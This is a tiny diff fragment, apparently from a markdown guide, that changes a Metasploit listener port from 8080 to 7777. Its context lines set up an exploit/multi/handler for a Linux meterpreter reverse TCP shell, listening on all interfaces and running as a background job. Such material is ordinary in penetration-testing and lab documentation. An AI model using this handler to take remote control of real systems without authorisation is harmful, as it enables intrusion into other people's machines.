@@ -47,7 +47,7 @@ msfconsole -q
 use exploit/multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
-set LPORT 8080
+set LPORT 7777
 set ExitOnSession false
 exploit -j
 ```
